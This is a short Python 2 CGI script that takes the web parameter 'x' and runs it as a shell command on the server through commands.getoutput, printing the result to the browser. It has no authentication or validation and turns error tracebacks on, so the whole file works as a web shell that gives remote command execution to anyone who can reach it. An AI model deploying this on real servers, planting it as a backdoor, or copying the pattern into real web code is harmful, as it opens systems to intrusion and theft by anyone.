#!/usr/bin/python2
import cgi 
import cgitb
cgitb.enable()
import commands
print "content-type:text/html"
print ""
web_data=cgi.FieldStorage()
out=web_data.getvalue('x')
result=commands.getoutput(out)
print result



